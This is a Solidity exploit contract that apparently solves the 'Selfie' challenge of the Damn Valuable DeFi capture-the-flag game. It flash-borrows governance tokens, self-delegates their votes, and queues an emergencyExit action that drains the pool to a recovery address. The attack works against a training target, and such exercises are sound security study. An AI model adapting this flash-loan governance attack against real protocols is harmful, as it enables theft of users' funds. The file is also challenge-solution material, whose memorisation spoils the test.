// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieSolve is IERC3156FlashBorrower {
    DamnValuableVotes immutable token;
    SimpleGovernance immutable governance;
    SelfiePool immutable pool;

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    uint256 actionID;
    address recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external
        returns (uint256)
    {
        pool.flashLoan(
            this, 
            address(token),
            TOKENS_IN_POOL, 
            bytes("")
            );

        return actionID;
    }

    function onFlashLoan(address, address , uint256 , uint256, bytes calldata) 
        external returns (bytes32)
    {

        // check if we have enough votes
        console.log("votes: ", token.balanceOf(address(this)));

        token.delegate(address(this));
        // propose emergencyExit as action
        actionID = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature(
                "emergencyExit(address)",
                address(recovery)
            )
        );

        token.approve(address(pool), token.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}